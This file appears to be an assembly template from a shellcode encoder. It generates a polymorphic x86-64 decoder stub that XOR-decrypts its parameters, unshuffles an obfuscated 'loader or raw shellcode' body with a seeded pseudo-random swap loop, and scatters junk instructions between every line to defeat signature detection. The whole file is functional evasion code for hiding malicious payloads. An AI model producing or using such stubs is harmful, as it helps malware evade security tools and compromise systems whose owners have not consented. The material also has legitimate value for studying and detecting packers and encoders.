.code64

// iji means insert junk instruction
// ijs means insert junk instruction with short version

// {{.Reg.rax}} store the seed
// {{.Reg.rbx}} store the key and multiplier
// {{.Reg.rcx}} store the increment
// {{.Reg.rdx}} store the loop times
// {{.Reg.rbp}} store the body address
// {{.Reg.rsi}} store the swapped address about i
// {{.Reg.rdi}} store the swapped address about j

entry:
  // save context
  push {{.Reg.rax}}                            {{iji}}
  push {{.Reg.rbx}}                            {{iji}}
  push {{.Reg.rcx}}                            {{iji}}
  push {{.Reg.rdx}}                            {{iji}}
  push {{.Reg.rbp}}                            {{iji}}
  push {{.Reg.rsi}}                            {{iji}}
  push {{.Reg.rdi}}                            {{iji}}
  pushfq                                       {{iji}}

  // load seed and key
  mov {{.Reg.rax}}, {{hex .Seed}}              {{iji}}
  mov {{.Reg.rbx}}, {{hex .Key}}               {{iji}}

  // decrypt increment
  mov {{.Reg.rcx}}, {{hex .Imm.Inc}}           {{iji}}
  xor {{.Reg.rcx}}, {{.Reg.rbx}}               {{iji}}

  // decrypt multiplier and destroy key
  mov {{.Reg.rdx}}, {{hex .Imm.Mul}}           {{iji}}
  xor {{.Reg.rbx}}, {{.Reg.rdx}}               {{iji}}

  // decrypt the loop time and prevent continuous 0x00
  mov {{.Reg.edx}}, {{hex .NumLoopStub}}       {{iji}}
  xor {{.Reg.edx}}, {{hex .NumLoopMaskA}}      {{iji}}
  xor {{.Reg.edx}}, {{hex .NumLoopMaskB}}      {{iji}}

  // check the loop time is zero
  test {{.Reg.edx}}, {{.Reg.edx}}              {{iji}}
  jz skip_unshuffle                            {{iji}}

  // calculate the body address
  lea {{.Reg.rbp}}, [rip + body + {{hex .OffsetT}}]   {{iji}}
  add {{.Reg.rbp}}, {{hex .OffsetA}}                  {{iji}}
  sub {{.Reg.rbp}}, {{hex .OffsetS}}                  {{iji}}

  // unshuffle shellcode body
 loop_unshuffle:
  // seed = seed * multiplier + increment
  imul {{.Reg.rax}}, {{.Reg.rbx}}              {{iji}}
  add {{.Reg.rax}}, {{.Reg.rcx}}               {{iji}}

  // save seed and calculate seed >> 3
  push {{.Reg.rax}}                            {{iji}}
  shr {{.Reg.rax}}, 3                          {{iji}}

  // reserve space for store the div result
  sub rsp, 8                                   {{iji}}

  // save context about execute div
  push rax                                     {{iji}}
  push rcx                                     {{iji}}
  push rdx                                     {{iji}}

  // calculate seed % (i + 1)
  // push/pop for prevent register conflict
  push {{.Reg.rdx}}                            {{iji}}
  push {{.Reg.rax}}                            {{iji}}
  pop rax                                      {{iji}}
  pop rcx                                      {{iji}}
  inc rcx                                      {{iji}}
  xor rdx, rdx                                 {{iji}}
  div rcx                                      {{iji}}

  // store the div result
  mov [rsp + 3*8], rdx                         {{iji}}

  // restore context about execute div
  pop rdx                                      {{iji}}
  pop rcx                                      {{iji}}
  pop rax                                      {{iji}}

  // calculate the swapped data address
  mov {{.Reg.esi}}, {{.Reg.edx}}               {{iji}}
  add {{.Reg.rsi}}, {{.Reg.rbp}}               {{iji}}
  mov {{.Reg.rdi}}, [rsp]                      {{iji}}
  add {{.Reg.rdi}}, {{.Reg.rbp}}               {{iji}}

  // swap data[i] and data[j]
  mov {{.Reg.al}}, [{{.Reg.rsi}}]              {{iji}}
  xchg {{.Reg.al}}, [{{.Reg.rdi}}]             {{iji}}
  mov [{{.Reg.rsi}}], {{.Reg.al}}              {{iji}}

  // restore stack
  add rsp, 8                                   {{iji}}

  // restore seed
  pop {{.Reg.rax}}                             {{iji}}

  // update loop counter
  dec {{.Reg.edx}}                             {{iji}}
  jnz loop_unshuffle                           {{iji}}
 skip_unshuffle:

  // restore context
  popfq                                        {{iji}}
  pop {{.Reg.rdi}}                             {{iji}}
  pop {{.Reg.rsi}}                             {{iji}}
  pop {{.Reg.rbp}}                             {{iji}}
  pop {{.Reg.rdx}}                             {{iji}}
  pop {{.Reg.rcx}}                             {{iji}}
  pop {{.Reg.rbx}}                             {{iji}}
  pop {{.Reg.rax}}                             {{iji}}

body:
  // loader or raw shellcode
